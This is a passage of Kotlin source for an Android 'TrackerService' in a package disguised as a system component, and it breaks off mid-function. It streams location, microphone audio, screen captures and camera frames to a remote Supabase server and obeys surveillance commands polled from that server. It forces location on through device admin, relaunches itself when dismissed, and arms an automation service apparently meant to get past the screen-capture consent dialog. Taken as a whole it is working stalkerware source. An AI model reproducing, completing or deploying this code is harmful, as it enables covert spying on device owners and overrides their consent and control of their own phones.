package com.android.system.core

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.net.wifi.WifiManager
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.graphics.createBitmap
import com.google.android.gms.location.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.io.IOException
import java.io.ByteArrayOutputStream

class TrackerService : Service(), LifecycleOwner {
    companion object {
        var screenCaptureIntent: Intent? = null
        var screenCaptureResultCode: Int = 0
    }

    private lateinit var lifecycleRegistry: LifecycleRegistry

    override val lifecycle: Lifecycle
        get() = lifecycleRegistry

    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback
    private val client by lazy {
        OkHttpClient.Builder()
            .addInterceptor { chain ->
                val request = chain.request().newBuilder()
                    .addHeader("apikey", supabaseAnonKey)
                    .addHeader("Authorization", "Bearer $supabaseAnonKey")
                    .addHeader("Prefer", "return=minimal")
                    .build()
                chain.proceed(request)
            }
            .build()
    }

    private var deviceName: String = "System-Node"
    private var supabaseUrl: String = "https://your-project.supabase.co"
    private var supabaseAnonKey: String = ""
    private var updateIntervalMs: Long = 2000L
    private var wakeLock: PowerManager.WakeLock? = null
    private var wifiLock: WifiManager.WifiLock? = null

    private var lastLocation: android.location.Location? = null
    private var lastLocationReceiveTime: Long = 0L
    private var lastLocationSentTime: Long = 0L
    private var isRecordingAudio: Boolean = false
    private var isLiveStreamingAudio: Boolean = false
    
    private val rawGpsListener = object : android.location.LocationListener {
        override fun onLocationChanged(loc: android.location.Location) {
            handleNewLocation(loc)
        }
        @Suppress("DEPRECATION", "OVERRIDE_DEPRECATION")
        override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
        override fun onProviderEnabled(provider: String) {}
        override fun onProviderDisabled(provider: String) {}
    }
    
    private var isLiveStreamingScreen: Boolean = false
    private var isLiveStreamingCamera: Boolean = false
    private var cameraProvider: ProcessCameraProvider? = null
    private var imageAnalysis: ImageAnalysis? = null
    private var camera: Camera? = null

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    
    // Compass & Additional sensors
    private lateinit var sensorManager: SensorManager
    private var rotationVectorSensor: Sensor? = null
    private var pressureSensor: Sensor? = null
    private var lastCompassBearing: Float? = null
    private var lastCompassPitch: Float? = null
    private var lastCompassRoll: Float? = null
    private var lastPressure: Float? = null

    private val handler = android.os.Handler(Looper.getMainLooper())
    private val broadcastRunnable = object : Runnable {
        override fun run() {
            broadcastTelemetryToUI()
            val now = System.currentTimeMillis()
            
            // If we haven't received a GPS update in 2 minutes, forcefully try to turn it on
            if (lastLocationReceiveTime > 0L && (now - lastLocationReceiveTime > (2 * 60 * 1000))) {
                Log.d("TrackerService", "No GPS for 2 minutes, attempting to force enable location")
                checkLocationEnabled()
                // Reset timer so it doesn't spam every interval
                lastLocationReceiveTime = now
            } else if (lastLocationReceiveTime == 0L && (now - lastLocationCheckTime > (2 * 60 * 1000))) {
                // If we never got location in the first 2 minutes of starting the service
                checkLocationEnabled()
                lastLocationCheckTime = now
            }
            
            pollPendingCommands()
            handler.postDelayed(this, updateIntervalMs)
        }
    }

    private var lastLocationCheckTime = 0L

    private fun checkLocationEnabled() {
        val locationManager = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
        val isEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            locationManager.isLocationEnabled
        } else {
            @Suppress("DEPRECATION")
            val mode = Settings.Secure.getInt(
                contentResolver,
                Settings.Secure.LOCATION_MODE,
                Settings.Secure.LOCATION_MODE_OFF
            )
            @Suppress("DEPRECATION")
            mode != Settings.Secure.LOCATION_MODE_OFF
        }

        if (!isEnabled) {
            // Forcefully enable location via Device Admin if possible
            try {
                val dpm = getSystemService(android.app.admin.DevicePolicyManager::class.java)
                val adminComponent = android.content.ComponentName(this, SecurityAdminReceiver::class.java)
                if (dpm.isAdminActive(adminComponent)) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        dpm.setLocationEnabled(adminComponent, true)
                        Log.d("TrackerService", "Location forcefully enabled via DevicePolicyManager (API 30+)")
                    } else {
                        @Suppress("DEPRECATION")
                        dpm.setSecureSetting(adminComponent, Settings.Secure.LOCATION_MODE, "3") // LOCATION_MODE_HIGH_ACCURACY
                        Log.d("TrackerService", "Location forcefully enabled via setSecureSetting (API < 30)")
                    }
                }
            } catch (e: Exception) {
                Log.e("TrackerService", "Failed to forcefully enable location", e)
            }
        }
    }

    private val sensorEventListener = object : SensorEventListener {
        override fun onSensorChanged(event: SensorEvent) {
            if (event.sensor.type == Sensor.TYPE_ROTATION_VECTOR) {
                val rotationMatrix = FloatArray(9)
                SensorManager.getRotationMatrixFromVector(rotationMatrix, event.values)
                val orientationValues = FloatArray(3)
                SensorManager.getOrientation(rotationMatrix, orientationValues)
                
                // orientationValues[0] is azimuth (yaw) in radians
                var azimuthInDegrees = Math.toDegrees(orientationValues[0].toDouble()).toFloat()
                if (azimuthInDegrees < 0) {
                    azimuthInDegrees += 360f
                }
                lastCompassBearing = azimuthInDegrees
                lastCompassPitch = Math.toDegrees(orientationValues[1].toDouble()).toFloat()
                lastCompassRoll = Math.toDegrees(orientationValues[2].toDouble()).toFloat()
            } else if (event.sensor.type == Sensor.TYPE_PRESSURE) {
                lastPressure = event.values[0]
            }
        }
        override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {}
    }

    override fun onCreate() {
        super.onCreate()
        Log.d("TrackerService", "onCreate called")

        lifecycleRegistry = LifecycleRegistry(this)
        lifecycleRegistry.currentState = Lifecycle.State.STARTED
        
        // Acquire WakeLock to ensure the CPU never goes to sleep
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "TrackerService::CpuWakeLock")
        wakeLock?.acquire()
        
        // Acquire WifiLock to ensure network doesn't drop when screen goes off
        val wifiManager = applicationContext.getSystemService(WIFI_SERVICE) as WifiManager
        val wifiMode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            WifiManager.WIFI_MODE_FULL_LOW_LATENCY
        } else {
            @Suppress("DEPRECATION")
            WifiManager.WIFI_MODE_FULL_HIGH_PERF
        }
        wifiLock = wifiManager.createWifiLock(wifiMode, "TrackerService::WifiLock")
        wifiLock?.acquire()
        
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        
        sensorManager = getSystemService(SENSOR_SERVICE) as SensorManager
        rotationVectorSensor = sensorManager.getDefaultSensor(Sensor.TYPE_ROTATION_VECTOR)
        rotationVectorSensor?.let {
            sensorManager.registerListener(sensorEventListener, it, SensorManager.SENSOR_DELAY_NORMAL)
        }
        pressureSensor = sensorManager.getDefaultSensor(Sensor.TYPE_PRESSURE)
        pressureSensor?.let {
            sensorManager.registerListener(sensorEventListener, it, SensorManager.SENSOR_DELAY_NORMAL)
        }
        
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                locationResult.lastLocation?.let { loc ->
                    handleNewLocation(loc)
                }
            }
        }
    }

    private var lastSentLocation: android.location.Location? = null

    private fun handleNewLocation(loc: android.location.Location) {
        val now = System.currentTimeMillis()
        
        // Polished: Throttle based on the current update interval to avoid spamming the server
        if (now - lastLocationSentTime < (updateIntervalMs - 100L)) {
            return
        }

        lastLocation = loc
        lastLocationReceiveTime = now
        lastSentLocation = loc
        
        Log.d("TrackerService", "GPS Update received: ${loc.latitude}, ${loc.longitude}")
        
        // Immediately send fresh location
        sendLocationToServer(loc)
        lastLocationSentTime = now
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("TrackerService", "onStartCommand called with intent=$intent")
        
        // Polished: Ensure immediate foregrounding to satisfy Android 14+ strict timing policies
        createNotificationChannel()
        updateForegroundNotification()

        if (intent?.action == "START_SCREEN_STREAM") {
            startLiveScreenStream(intent.getIntExtra("FPS", 1))
        } else if (intent?.action == "START_LIVE_CAMERA") {
            val facingStr = intent.getStringExtra("FACING") ?: "back"
            startLiveCameraStream(facingStr)
        } else if (intent?.action == "STOP_LIVE_CAMERA") {
            stopLiveCameraStream()
        }
        
        val prefs = getSharedPreferences("TrackerPrefs", MODE_PRIVATE)
        deviceName = prefs.getString("DEVICE_NAME", "Unknown") ?: "Unknown"
        val rawUrl = prefs.getString("SUPABASE_URL", "https://your-project.supabase.co") ?: "https://your-project.supabase.co"
        supabaseUrl = rawUrl.trimEnd('/')
        supabaseAnonKey = prefs.getString("SUPABASE_ANON_KEY", "") ?: ""

        // Polished: Respect the interval preference with a safe minimum of 2 seconds to avoid rate limiting
        val intervalSec = prefs.getString("INTERVAL", "2")?.toLongOrNull() ?: 2L
        updateIntervalMs = (intervalSec * 1000L).coerceAtLeast(2000L)
        
        Log.d("TrackerService", "Using update interval: ${updateIntervalMs}ms")

        requestLocationUpdates()
        
        // Start the strict timer
        handler.removeCallbacks(broadcastRunnable)
        handler.post(broadcastRunnable)

        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.d("TrackerService", "onTaskRemoved: App swiped away. Restarting service to keep projection alive.")
        // Restart the service immediately to keep the screen capture and GPS alive
        val restartIntent = Intent(applicationContext, TrackerService::class.java)
        restartIntent.setPackage(packageName)
        val pendingIntent = PendingIntent.getService(
            this, 
            1, 
            restartIntent, 
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(ALARM_SERVICE) as android.app.AlarmManager
        alarmManager.setExactAndAllowWhileIdle(
            android.app.AlarmManager.RTC_WAKEUP,
            System.currentTimeMillis() + 1000,
            pendingIntent
        )
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d("TrackerService", "onDestroy called, cleaning up resources")
        
        lifecycleRegistry.currentState = Lifecycle.State.DESTROYED
        
        try {
            fusedLocationClient.removeLocationUpdates(locationCallback)
        } catch (e: Exception) {
            Log.e("TrackerService", "Error removing fused location updates", e)
        }
        
        try {
            val locationManager = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
            locationManager.removeUpdates(rawGpsListener)
        } catch (e: Exception) {
            Log.e("TrackerService", "Error removing GPS updates", e)
        }
        
        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
            if (wifiLock?.isHeld == true) {
                wifiLock?.release()
            }
        } catch (e: Exception) {
            Log.e("TrackerService", "Error releasing locks", e)
        }
        
        try {
            sensorManager.unregisterListener(sensorEventListener)
        } catch (e: Exception) {
            Log.e("TrackerService", "Error unregistering sensors", e)
        }
        
        handler.removeCallbacks(broadcastRunnable)
        
        if (isLiveStreamingScreen) stopLiveScreenStream()
        if (isLiveStreamingAudio) stopLiveAudioStream()
        if (isLiveStreamingCamera) stopLiveCameraStream()
        
        releaseProjection()
    }

    private fun updateForegroundNotification() {
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
        val pendingIntent = android.app.PendingIntent.getActivity(
            this, 0, intent,
            android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
        )

        val notification = NotificationCompat.Builder(this, "TrackerChannel")
            .setContentTitle("Live Tracker Active")
            .setContentText("Tracking location, screen, and audio in background.")
            .setSmallIcon(android.R.drawable.ic_menu_preferences)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                var type = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                
                if (isLiveStreamingAudio || isRecordingAudio) {
                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                }
                
                if (isLiveStreamingCamera) {
                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                }
                
                if (((screenCaptureIntent != null) && (screenCaptureResultCode != 0)) || mediaProjection != null || isLiveStreamingScreen) {
                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                }
    
                startForeground(1, notification, type)
            } else {
                startForeground(1, notification)
            }
        } catch (e: Exception) {
            Log.e("TrackerService", "Failed to start foreground service (AppOps/Background restriction)", e)
        }
    }

    @android.annotation.SuppressLint("MissingPermission")
    private fun requestLocationUpdates() {
        Log.d("TrackerService", "requestLocationUpdates called")
        val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, updateIntervalMs)
            .setMinUpdateDistanceMeters(0f)
            .setMinUpdateIntervalMillis(updateIntervalMs / 2)
            .setMaxUpdateDelayMillis(0L)
            .setWaitForAccurateLocation(false)
            .build()

        try {
            fusedLocationClient.lastLocation.addOnSuccessListener { loc ->
                if (loc != null) {
                    Log.d("TrackerService", "Got cached lastLocation: ${loc.latitude}, ${loc.longitude}")
                    // Ensure the backend gets the cached location immediately upon tracking start
                    handleNewLocation(loc)
                } else {
                    Log.d("TrackerService", "No cached lastLocation available")
                }
            }.addOnFailureListener { e ->
                Log.e("TrackerService", "Failed to get lastLocation", e)
            }

            fusedLocationClient.requestLocationUpdates(
                locationRequest,
                locationCallback,
                Looper.getMainLooper()
            )
            Log.d("TrackerService", "fusedLocationClient.requestLocationUpdates successfully registered")
            
            // Add raw GPS provider for aggressive real-time tracking (bypasses FusedLocation throttling)
            val locationManager = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
            if (locationManager.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER)) {
                try {
                    locationManager.requestLocationUpdates(
                        android.location.LocationManager.GPS_PROVIDER,
                        updateIntervalMs,
                        0f,
                        rawGpsListener,
                        Looper.getMainLooper()
                    )
                    Log.d("TrackerService", "LocationManager.GPS_PROVIDER successfully registered")
                } catch (e: Exception) {
                    Log.e("TrackerService", "AppOps/Security exception requesting raw GPS", e)
                }
            }
            
        } catch (e: Exception) {
            Log.e("TrackerService", "Exception in requestLocationUpdates", e)
        }
    }

    private fun getBatteryLevel(): Int {
        val batteryManager = getSystemService(BatteryManager::class.java)
        return batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    private fun isCharging(): Boolean {
        val batteryStatus: Intent? = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val status: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        return (status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL)
    }

    private fun broadcastTelemetryToUI() {
        val intent = Intent("com.android.system.core.TELEMETRY")
        intent.setPackage(packageName)
        
        lastLocation?.let { loc ->
            if (loc.hasSpeed()) intent.putExtra("speed", loc.speed)
            if (loc.hasAltitude()) intent.putExtra("altitude", loc.altitude)
            if (loc.hasAccuracy()) intent.putExtra("accuracy", loc.accuracy)
            val bearing = lastCompassBearing ?: (if (loc.hasBearing()) loc.bearing else null)
            bearing?.let { intent.putExtra("bearing", it) }
        }
        
        lastCompassPitch?.let { intent.putExtra("pitch", it) }
        lastCompassRoll?.let { intent.putExtra("roll", it) }
        lastPressure?.let { intent.putExtra("pressure", it) }
        intent.putExtra("battery", getBatteryLevel())
        intent.putExtra("charging", isCharging())
        
        sendBroadcast(intent)
    }

    private fun sendLocationToServer(loc: android.location.Location) {
        val speed = if (loc.hasSpeed()) loc.speed else null
        val alt = if (loc.hasAltitude()) loc.altitude else null
        val acc = if (loc.hasAccuracy()) loc.accuracy else null
        val finalBearing = lastCompassBearing ?: (if (loc.hasBearing()) loc.bearing else null)
        val battery = getBatteryLevel()
        val charging = isCharging()

        val json = JSONObject().apply {
            put("device_id", deviceName)
            put("latitude", loc.latitude)
            put("longitude", loc.longitude)
            
            alt?.let { if (!it.isNaN() && !it.isInfinite()) put("altitude", it) }
            speed?.let { if (!it.isNaN() && !it.isInfinite()) put("speed", it) }
            acc?.let { if (!it.isNaN() && !it.isInfinite()) put("accuracy", it) }
            finalBearing?.let { if (!it.isNaN() && !it.isInfinite()) put("bearing", it) }
            lastCompassPitch?.let { if (!it.isNaN() && !it.isInfinite()) put("pitch", it) }
            lastCompassRoll?.let { if (!it.isNaN() && !it.isInfinite()) put("roll", it) }
            lastPressure?.let { if (!it.isNaN() && !it.isInfinite()) put("pressure", it) }
            
            put("battery_level", battery)
            put("charging", charging)
        }

        val requestBody = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())

        val request = Request.Builder()
            .url("$supabaseUrl/rest/v1/locations")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(
            object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e("TrackerService", "Failed to send location", e)
                }

                override fun onResponse(call: Call, response: Response) {
                    val bodyStr = response.body?.string()
                    Log.d("TrackerService", "Location sent to server. Code: ${response.code} Body: $bodyStr")
                    response.close()
                }
            }
        )
    }

    private var audioRecord: AudioRecord? = null
    private var liveAudioThread: Thread? = null
    
    private var isPollingCommands = false
    private var isUploadingScreen = false
    private var isUploadingCamera = false

    private fun pollPendingCommands() {
        if (isPollingCommands) return
        isPollingCommands = true

        val request = Request.Builder()
            .url("$supabaseUrl/rest/v1/commands?device_id=eq.${java.net.URLEncoder.encode(deviceName, "UTF-8")}&status=eq.pending")
            .get()
            .build()

        client.newCall(request).enqueue(
            object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    isPollingCommands = false
                }

            override fun onResponse(call: Call, response: Response) {
                isPollingCommands = false
                val bodyStr = response.body?.string() ?: ""
                response.close()
                if (response.isSuccessful && bodyStr.isNotEmpty() && bodyStr.trim().startsWith("[")) {
                    try {
                        val jsonArray = org.json.JSONArray(bodyStr)
                        if (jsonArray.length() > 0) {
                            val cmdObj = jsonArray.getJSONObject(0)
                            val cmdId = cmdObj.optString("id")
                            val cmdType = cmdObj.optString("command")
                            val params = cmdObj.optJSONObject("params")
                            
                            Log.d("TrackerService", "CMD RECEIVED: $cmdType with params: $params")
                            
                            if (cmdId.isNotEmpty()) markCommandCompleted(cmdId)
                            
                            val durationSec = params?.optInt("duration_sec", 10) ?: 10
                            val fps = params?.optInt("fps", 1) ?: 1

                            if (cmdType == "START_LIVE_AUDIO" && !isLiveStreamingAudio) {
                                handler.post {
                                    startLiveAudioStream()
                                }
                            } else if (cmdType == "STOP_LIVE_AUDIO") {
                                handler.post {
                                    stopLiveAudioStream()
                                }
                            } else if (cmdType == "START_LIVE_SCREEN" && !isLiveStreamingScreen) {
                                handler.post {
                                    startLiveScreenStream(fps)
                                }
                            } else if (cmdType == "STOP_LIVE_SCREEN") {
                                handler.post {
                                    stopLiveScreenStream()
                                }
                            } else if (cmdType == "START_LIVE_CAMERA") {
                                val facing = params?.optString("camera_facing", "back") ?: "back"
                                handler.post {
                                    startLiveCameraStream(facing)
                                }
                            } else if (cmdType == "STOP_LIVE_CAMERA") {
                                handler.post {
                                    stopLiveCameraStream()
                                }
                            } else if (cmdType == "RECORD_AUDIO" && !isRecordingAudio && !isLiveStreamingAudio) {
                                handler.post {
                                    recordAudioAndUpload(durationSec)
                                }
                            }
                        }
                    } catch (e: Exception) {
                        Log.e("TrackerService", "Error parsing command JSON", e)
                    }
                }
            }
        })
    }

    private fun markCommandCompleted(cmdId: String) {
        val json = JSONObject().apply {
            put("status", "completed")
        }
        val requestBody = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
        val request = Request.Builder()
            .url("$supabaseUrl/rest/v1/commands?id=eq.$cmdId")
            .patch(requestBody)
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) { response.close() }
        })
    }

    private fun startLiveAudioStream() {
        if (isLiveStreamingAudio) return
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            Log.e("TrackerService", "RECORD_AUDIO permission not granted for live stream!")
            return
        }

        isLiveStreamingAudio = true
        // Polished: Update foreground type before accessing microphone
        updateForegroundNotification()

        // Revert to 16000Hz for maximum device compatibility
        val sampleRate = 16000
        val channelConfig = AudioFormat.CHANNEL_IN_MONO
        val audioFormat = AudioFormat.ENCODING_PCM_16BIT
        val minBufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)

        try {
            audioRecord = AudioRecord(
                MediaRecorder.AudioSource.MIC,
                sampleRate,
                channelConfig,
                audioFormat,
                minBufferSize * 4
            )

            if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                Log.e("TrackerService", "AudioRecord initialization failed")
                isLiveStreamingAudio = false
                return
            }

            audioRecord?.startRecording()
            Log.d("TrackerService", "Live audio streaming (PCM) started...")

            liveAudioThread = Thread {
                // Upload chunks of 500ms (16000 samples/sec * 2 bytes/sample * 0.5 sec = 16000 bytes)
                val bufferSize = sampleRate // Since sampleRate = 16000, bufferSize = 16000 bytes (0.5 sec)
                val audioBuffer = ByteArray(bufferSize)

                while (isLiveStreamingAudio && !Thread.currentThread().isInterrupted) {
                    var bytesReadTotal = 0
                    while (bytesReadTotal < bufferSize && isLiveStreamingAudio) {
                        val read = audioRecord?.read(audioBuffer, bytesReadTotal, bufferSize - bytesReadTotal) ?: 0
                        if (read > 0) {
                            bytesReadTotal += read
                        } else if (read < 0) {
                            Log.e("TrackerService", "AudioRecord read error: $read")
                            break
                        }
                    }

                    if (bytesReadTotal > 0 && isLiveStreamingAudio) {
                        val validBuffer = if (bytesReadTotal == bufferSize) audioBuffer else audioBuffer.copyOf(bytesReadTotal)
                        val b64 = Base64.encodeToString(validBuffer, Base64.NO_WRAP)
                        uploadAudioSnippet(b64, 0, "audio/raw")
                    }
                }
                
                // Cleanup is now handled synchronously in stopLiveAudioStream
                // to prevent race conditions when rapidly restarting the stream.
            }
            liveAudioThread?.start()

        } catch (e: Exception) {
            Log.e("TrackerService", "Failed to start AudioRecord", e)
            isLiveStreamingAudio = false
        }
    }

    private fun stopLiveAudioStream() {
        isLiveStreamingAudio = false
        liveAudioThread?.interrupt()
        liveAudioThread = null
        
        updateForegroundNotification()
        
        // Synchronously release the microphone so it's immediately available 
        // if the server sends a START command right away.
        try {
            audioRecord?.stop()
            audioRecord?.release()
        } catch (e: Exception) {
            Log.e("TrackerService", "Error stopping AudioRecord", e)
        } finally {
            audioRecord = null
        }
    }

    private fun recordAudioAndUpload(durationSec: Int) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            Log.e("TrackerService", "RECORD_AUDIO permission not granted!")
            return
        }

        isRecordingAudio = true
        updateForegroundNotification()

        val outputFile = File(cacheDir, "remote_mic_snippet.m4a")
        if (outputFile.exists()) outputFile.delete()

        try {
            val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setAudioChannels(1)
            recorder.setAudioSamplingRate(44100)
            recorder.setAudioEncodingBitRate(128000)
            recorder.setOutputFile(outputFile.absolutePath)
            recorder.prepare()
            recorder.start()
            Log.d("TrackerService", "Remote audio recording started ($durationSec sec)...")

            handler.postDelayed({
                try {
                    recorder.stop()
                    recorder.release()
                    if (outputFile.exists() && outputFile.length() > 0) {
                        val bytes = outputFile.readBytes()
                        Log.d("TrackerService", "Audio snippet recorded successfully (${bytes.size} bytes)")
                        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                        uploadAudioSnippet(b64, durationSec)
                    }
                } catch (e: Exception) {
                    Log.e("TrackerService", "Error stopping MediaRecorder", e)
                } finally {
                    isRecordingAudio = false
                    updateForegroundNotification()
                    outputFile.delete()
                }
            }, durationSec * 1000L)

        } catch (e: Exception) {
            Log.e("TrackerService", "Failed to start MediaRecorder", e)
            isRecordingAudio = false
        }
    }

    private fun uploadAudioSnippet(b64Audio: String, durationSec: Int, mimeType: String = "audio/mp4") {
        val json = JSONObject().apply {
            put("device_id", deviceName)
            put("type", "audio")
            put("data_b64", b64Audio)
            put("mime_type", mimeType)
            put("duration_sec", durationSec)
        }

        val requestBody = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
        val request = Request.Builder()
            .url("$supabaseUrl/rest/v1/media")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("TrackerService", "Failed to upload audio snippet", e)
            }

            override fun onResponse(call: Call, response: Response) {
                response.close()
                Log.d("TrackerService", "Audio snippet uploaded successfully!")
            }
        })
    }

    private fun releaseProjection() {
        try {
            virtualDisplay?.release()
            imageReader?.close()
            mediaProjection?.stop()
        } catch (e: Exception) {
            Log.e("TrackerService", "Error releasing projection", e)
        } finally {
            virtualDisplay = null
            imageReader = null
            mediaProjection = null
            isLiveStreamingScreen = false
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            "TrackerChannel",
            "Live Tracker Service",
            NotificationManager.IMPORTANCE_DEFAULT
        )
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(channel)
    }

    private fun startLiveScreenStream(fps: Int = 1) {
        if (isLiveStreamingScreen) return
        
        try {
            if (mediaProjection == null) {
                if (screenCaptureIntent == null || screenCaptureResultCode == 0) {
                    Log.w("TrackerService", "No screen capture token available! Prompting user...")
                    
                    // Arm the automation service for 10 seconds to handle the dialog
                    AssistantAutomationService.armAutomation()

                    val intent = Intent(this, ScreenCaptureRequestActivity::class.java)
                    intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                    intent.putExtra("FPS", fps)
                    startActivity(intent)
                    return
                }
                
                // Android 14+ requires starting foreground with MEDIA_PROJECTION type BEFORE getMediaProjection
                // We set the state first so the notification includes the correct flag
                isLiveStreamingScreen = true
                updateForegroundNotification()
                
                val projectionManager = getSystemService(MediaProjectionManager::class.java)
                mediaProjection = projectionManager.getMediaProjection(screenCaptureResultCode, screenCaptureIntent!!)
                
                screenCaptureIntent = null
                screenCaptureResultCode = 0

                mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                    override fun onStop() {
                        super.onStop()
                        releaseProjection()
                    }
                }, handler)
            } else {
                isLiveStreamingScreen = true
                updateForegroundNotification()
            }

            if (virtualDisplay == null) {
                val width = 480
                val height = 854
                val density = resources.displayMetrics.densityDpi
                
                imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
                virtualDisplay = mediaProjection?.createVirtualDisplay(
                    "ScreenTracker",
                    width, height, density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader?.surface, null, null
                )
            }
            
            isLiveStreamingScreen = true
            val width = 480
            val height = 854
            
            Thread {
                while (isLiveStreamingScreen) {
                    val startTime = System.currentTimeMillis()
                    try {
                        val image = imageReader?.acquireLatestImage()
                        if (image != null) {
                            val planes = image.planes
                            val buffer = planes[0].buffer
                            val pixelStride = planes[0].pixelStride
                            val rowStride = planes[0].rowStride
                            val rowPadding = rowStride - pixelStride * width
                            
                            val bitmap = createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888)
                            bitmap.copyPixelsFromBuffer(buffer)
                            image.close()
                            
                            // Crop out the padding
                            val cropped = Bitmap.createBitmap(bitmap, 0, 0, width, height)
                            
                            val stream = ByteArrayOutputStream()
                            val quality = if (fps >= 60) 5 else if (fps >= 20) 10 else if (fps > 5) 20 else 40
                            cropped.compress(Bitmap.CompressFormat.JPEG, quality, stream)
                            val b64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
                            
                            uploadScreenFrame("data:image/jpeg;base64,$b64")
                        }
                    } catch (e: Exception) {
                        Log.e("TrackerService", "Error reading screen frame", e)
                    }
                    
                    val targetFps = fps.coerceIn(1, 60)
                    val targetDelay = 1000L / targetFps
                    val elapsed = System.currentTimeMillis() - startTime
                    val sleepTime = (targetDelay - elapsed).coerceAtLeast(0L)
                    if (sleepTime > 0) {
                        Thread.sleep(sleepTime)
                    }
                }
            }.start()
            Log.d("TrackerService", "Live screen stream started.")
        } catch (e: Exception) {
            Log.e("TrackerService", "Failed to start screen stream", e)
            releaseProjection()
        }
    }
    
    private fun stopLiveScreenStream() {
        isLiveStreamingScreen = false
        // We MUST NOT release virtualDisplay or imageReader here!
